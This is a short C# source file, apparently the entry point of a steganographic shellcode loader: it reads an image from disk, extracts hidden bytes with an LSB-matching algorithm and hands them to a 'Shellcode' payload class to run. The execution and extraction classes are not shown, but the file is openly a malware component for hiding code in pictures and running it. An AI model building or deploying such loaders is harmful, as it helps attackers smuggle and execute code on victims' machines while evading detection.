using System.Drawing;

using Reader.Algorithms;
using Reader.ImageSources;
using Reader.Payloads;

namespace Reader
{
    class Reader
    {
        static byte[] payload_data;

        static Bitmap bm;


        static IImageSource img  = new FileSystem();
        static IAlgorithm   alg  = new LSBM();
        static IPayload     pld  = new Shellcode();

        static void Main(string[] args)
        {
            if (args.Length == 2)
            {
                int payload_bits = int.Parse(args[0]);
                payload_data = new byte[payload_bits / 8];

                bm = img.loadImage(args[1]);
                alg.readImage(bm, payload_data);
                pld.Run(payload_data);
            }
        }
    }
}
